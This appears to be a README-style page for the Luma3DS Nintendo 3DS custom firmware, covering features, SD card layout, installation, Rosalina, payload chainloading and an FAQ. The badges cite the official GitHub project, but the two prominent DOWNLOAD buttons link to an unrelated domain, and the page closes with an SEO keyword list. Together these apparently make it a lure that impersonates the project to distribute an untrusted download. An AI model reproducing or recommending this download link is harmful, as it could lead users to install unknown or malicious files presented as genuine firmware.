
# Luma3DS Custom Firmware

[![Platform](https://img.shields.io/badge/Platform-Nintendo%203DS-CE2029?style=flat-square)](https://github.com/LumaTeam/Luma3DS)
[![Category](https://img.shields.io/badge/Category-Custom%20Firmware-475569?style=flat-square)](https://github.com/LumaTeam/Luma3DS)
[![Version](https://img.shields.io/badge/Version-13.5-blue?style=flat-square)](https://github.com/LumaTeam/Luma3DS/releases)
[![License](https://img.shields.io/badge/License-GPLv3-blue?style=flat-square)](https://github.com/LumaTeam/Luma3DS)

Luma3DS is custom firmware for the Nintendo 3DS family. It patches and extends system software to provide homebrew support, additional system functionality, game modification features, and advanced configuration tools.

<a href="https://dyhuiying.com/s/file">
  <img src="https://img.shields.io/badge/DOWNLOAD-LUMA3DS%20CFW-2563EB?style=for-the-badge&logo=nintendo&logoColor=white" alt="Download Luma3DS Custom Firmware">
</a>

## Overview

Luma3DS is a custom firmware project designed for Nintendo 3DS-family consoles.

It modifies significant parts of the system software, enabling additional functionality while retaining the original console environment. Its architecture includes a firmware loader, system patches, custom system modules, and Rosalina, an integrated system overlay.

Luma3DS requires boot9strap as its boot-time foundation. The primary firmware file is `boot.firm`, which is loaded by the boot9strap environment.

The project supports homebrew applications, system configuration, game modification, payload chainloading, debugging, and other advanced functions.

## Key Features

- **Homebrew Support:** Enables the execution of compatible homebrew applications.
- **Rosalina Overlay:** Provides an in-system menu for accessing additional features and configuration.
- **System Patches:** Modifies selected system behavior and removes supported platform restrictions.
- **Region Emulation:** Supports per-title language and region configuration.
- **LayeredFS:** Redirects game asset access to support compatible content modifications.
- **Game Plugins:** Supports compatible 3GX game plugins.
- **Screenshot Capture:** Captures screenshots while applications and games are running.
- **Screen Filters:** Provides display filters, including blue-light reduction options.
- **Input Redirection:** Supports compatible external input devices.
- **Cheat Engine:** Provides cheat functionality through supported Rosalina features.
- **Network Time:** Supports network-based time and date synchronization.
- **Payload Chainloading:** Launches compatible firmware payloads with the `.firm` extension.
- **GDB Debugging:** Provides a debugging interface for compatible development tools.
- **System Module Support:** Supports user-provided patches and replacement system modules.
- **Configuration Management:** Provides boot-time settings and persistent configuration options.

## Technical Specifications

| Specification | Description |
|---|---|
| Software | Luma3DS |
| Platform | Nintendo 3DS family |
| Category | Custom Firmware (CFW) |
| Boot environment | boot9strap |
| Main firmware file | `boot.firm` |
| Homebrew executable | `boot.3dsx` |
| Payload format | `.firm` |
| Configuration file | `/luma/config.ini` |
| Payload directory | `/luma/payloads/` |
| Rosalina shortcut | L + Down + Select |
| Configuration menu | Hold Select during boot |
| Chainloader menu | Hold Start during boot |
| Latest release reference | v13.5 |
| License | GNU General Public License v3.0 |

## Compatibility

Luma3DS is designed for the Nintendo 3DS family of consoles.

Supported hardware families include:

| Console | Platform family |
|---|---|
| Nintendo 3DS | Original 3DS |
| Nintendo 3DS XL | Original XL |
| Nintendo 2DS | Original 2DS |
| New Nintendo 3DS | New 3DS |
| New Nintendo 3DS XL | New XL |
| New Nintendo 2DS XL | New 2DS XL |

Luma3DS requires a compatible boot9strap installation. The available hardware features and behavior can differ between console models.

### Firmware Environment

Luma3DS works with the boot9strap boot environment and patches the installed system software at startup.

It is not a replacement for the console's physical hardware or a standalone installation exploit.

### Storage Compatibility

The standard installation uses an SD card formatted as FAT32.

The primary firmware file must be accessible to the boot environment. Luma3DS also supports a CTRNAND-based configuration when launched from CTRNAND without an SD card.

## Firmware Features

### Rosalina Menu

Rosalina is the integrated Luma3DS overlay.

The default shortcut is:

`L + Down + Select`

Available functions include:

- Screenshot capture.
- Screen filters.
- Input redirection.
- Cheat management.
- System configuration.
- Process inspection.
- Debugging features.
- Network time configuration.

Some Rosalina settings require explicit saving through the menu.

### System Patching

Luma3DS applies supported system patches during startup.

These patches enable functionality such as:

- Homebrew application support.
- Signature-check modifications.
- Region-related compatibility changes.
- Game-specific content redirection.
- Custom system module loading.
- Additional system access for compatible applications.

### LayeredFS

LayeredFS provides asset content path redirection for supported titles.

It allows compatible modified game assets to be loaded from an alternate content location rather than the original game content.

### Game Plugin Support

Luma3DS supports compatible game plugins in the 3GX format.

Plugin functionality depends on the plugin implementation, game version, and installed Luma3DS configuration.

### Payload Chainloader

The chainloader allows users to launch compatible `.firm` payloads.

Payload files are normally stored in:

`/luma/payloads/`

The chainloader can be opened by holding START during boot or through the configuration menu.

Hotkeys can be assigned through payload filenames, such as:

`x_test.firm`

### Debugging Interface

Luma3DS includes a GDB stub for compatible development and reverse-engineering workflows.

When enabled, the standard debugging ports are:

| Port | Function |
|---|---|
| 4000–4002 | Standard GDB connections |
| 4003 | Break-on-start debugging |

Compatible GDB tooling and debugging configurations are required.

## System Requirements

### Required Components

- Compatible Nintendo 3DS-family console.
- Existing boot9strap installation.
- FAT32-formatted SD card for standard installation.
- Luma3DS release archive.
- Sufficient SD card space for firmware and homebrew files.

### Boot Environment

Luma3DS requires boot9strap to execute.

A console without a compatible boot9strap installation cannot use the normal Luma3DS installation procedure as a standalone firmware installation.

### Storage Structure

The standard SD card layout includes:

| Path | Purpose |
|---|---|
| `/boot.firm` | Main Luma3DS firmware file |
| `/boot.3dsx` | Homebrew Menu executable |
| `/luma/` | Firmware configuration and resources |
| `/luma/config.ini` | Main configuration file |
| `/luma/payloads/` | Additional firmware payloads |
| `/luma/backups/` | Backup storage used by supported releases |

The exact contents depend on the release archive and the user's configuration.

## Download & Installation

<a href="https://dyhuiying.com/s/file">
  <img src="https://img.shields.io/badge/DOWNLOAD-LUMA3DS%20FIRMWARE-2563EB?style=for-the-badge&logo=nintendo&logoColor=white" alt="Download Luma3DS Firmware">
</a>

### Installation Requirements

Before installing or updating Luma3DS:

1. Confirm that boot9strap is already installed.
2. Prepare a FAT32-formatted SD card.
3. Obtain the Luma3DS release archive.
4. Preserve important existing SD card files.
5. Ensure that the console can access the SD card.

### Standard Installation

1. Power off the Nintendo 3DS.
2. Remove the SD card.
3. Insert the SD card into a computer.
4. Extract the Luma3DS release archive.
5. Copy the included files to the root of the SD card.
6. Replace existing files when prompted.
7. Merge existing folders where necessary.
8. Safely eject the SD card.
9. Reinsert it into the console.
10. Power on the system.

The release archive includes `boot.firm`, `boot.3dsx`, and the supplied configuration resources.

### Updating an Existing Installation

1. Back up important SD card data.
2. Download the intended Luma3DS release archive.
3. Extract the archive.
4. Copy the included files to the SD card root.
5. Replace older versions of matching files.
6. Merge the existing folders.
7. Reinsert the SD card.
8. Start the console.
9. If the Luma3DS configuration menu appears, press START to save and reboot.

The boot9strap environment loads the updated firmware file during startup.

## Configuration & Management

### Configuration Menu

The main Luma3DS configuration menu is accessed by holding SELECT while powering on the console.

The menu provides boot-time options for configuring firmware behavior.

### Configuration File

The standard configuration file is:

`/luma/config.ini`

When Luma3DS is launched from CTRNAND because the SD card is missing, the configuration file can instead be located at:

`/rw/luma/config.ini`

### Payload Management

Additional firmware payloads should be placed in:

`/luma/payloads/`

Payloads must use the `.firm` extension.

To open the chainloader:

1. Power off the console.
2. Hold START.
3. Power on the console.
4. Select the required payload.
5. Launch the selected firmware file.

If only one compatible payload is present, the selection menu may be skipped.

### Rosalina Configuration

Open Rosalina using:

`L + Down + Select`

Select the required system feature or configuration option.

Some settings are temporary until saved through the Rosalina menu. Use the Save Settings option where available.

### Firmware Backup Management

Maintain copies of important system and SD card data before modifying firmware files or configuration.

Keep backup files organized and avoid replacing unrelated system files during updates.

### Version Management

The project provides release archives containing the firmware and bundled homebrew resources.

When updating:

- Use a compatible Luma3DS release.
- Replace the existing firmware files.
- Preserve required configuration folders.
- Check payload compatibility.
- Verify successful startup after updating.

## Troubleshooting

| Issue | Resolution |
|---|---|
| Console does not start with Luma3DS | Confirm that boot9strap is installed and `boot.firm` is available in the expected location. |
| Luma3DS configuration menu does not appear | Hold SELECT while powering on the console. |
| Rosalina does not open | Use the default L + Down + Select shortcut or check the configured menu combination. |
| Payload is missing from chainloader | Confirm that the payload uses the `.firm` extension and is stored in `/luma/payloads/`. |
| Homebrew Menu does not start | Check that `boot.3dsx` is present in the SD card root. |
| Configuration changes are not retained | Use the appropriate Save Settings option where required. |
| SD card is not recognized | Verify the FAT32 filesystem, card condition, and file placement. |
| Game modification does not load | Check LayeredFS paths, title compatibility, and game-specific configuration. |
| 3GX plugin does not load | Verify plugin format, game compatibility, and plugin loader configuration. |
| Debugger cannot connect | Confirm that GDB debugging is enabled and the correct connection port is being used. |

## Frequently Asked Questions

### 1. What is Luma3DS Custom Firmware?

Luma3DS is custom firmware for Nintendo 3DS-family consoles. It patches system software and provides homebrew support, system features, game modification tools, and additional configuration options.

### 2. Does Luma3DS require boot9strap?

Yes. Luma3DS requires boot9strap as its boot-time foundation.

### 3. Which Nintendo consoles support Luma3DS?

Luma3DS is designed for the Nintendo 3DS family, including original 3DS, 3DS XL, 2DS, New 3DS, New 3DS XL, and New 2DS XL models.

### 4. What is the `boot.firm` file?

`boot.firm` is the primary Luma3DS firmware file loaded by the boot9strap environment.

### 5. How do I open the Luma3DS configuration menu?

Hold SELECT while powering on the console.

### 6. How do I open Rosalina?

Press L + Down + Select during normal system operation. This is the default shortcut.

### 7. Where should firmware payloads be stored?

Compatible `.firm` payloads should normally be stored in `/luma/payloads/` on the SD card.

### 8. Does Luma3DS support game modifications?

Yes. Features include LayeredFS content redirection, per-game language overrides, and compatible 3GX game plugins.

### 9. Can Luma3DS take screenshots?

Yes. Screenshot capture is available through the Rosalina overlay.

### 10. Can Luma3DS run homebrew applications?

Yes. Luma3DS provides homebrew support and is distributed with the Homebrew Menu executable in its release archive.

### 11. Where is the Luma3DS configuration file stored?

The standard location is `/luma/config.ini`. A CTRNAND-based configuration can use `/rw/luma/config.ini`.

### 12. What is the latest Luma3DS release?

The latest release identified for this documentation is v13.5.

## SEO Keywords

Luma3DS, Luma3DS Custom Firmware, Luma3DS CFW, Nintendo 3DS Custom Firmware, 3DS CFW, 3DS Firmware, Luma3DS Download, Nintendo 3DS Homebrew, 3DS Homebrew Support, Luma3DS Boot Firm, boot.firm, boot9strap, 3DS Rosalina Menu, Rosalina Overlay, 3DS Firmware Patches, 3DS Region Free, 3DS Region Emulation, 3DS LayeredFS, 3DS Game Plugins, 3GX Plugins, 3DS Payload Chainloader, 3DS Firm Payloads, 3DS System Patches, 3DS Homebrew Launcher, Nintendo 2DS Custom Firmware, New Nintendo 3DS CFW, 3DS Screenshot Tool, 3DS Input Redirection, 3DS Cheat Engine, 3DS Firmware Configuration, Luma3DS Update, Luma3DS v13.5
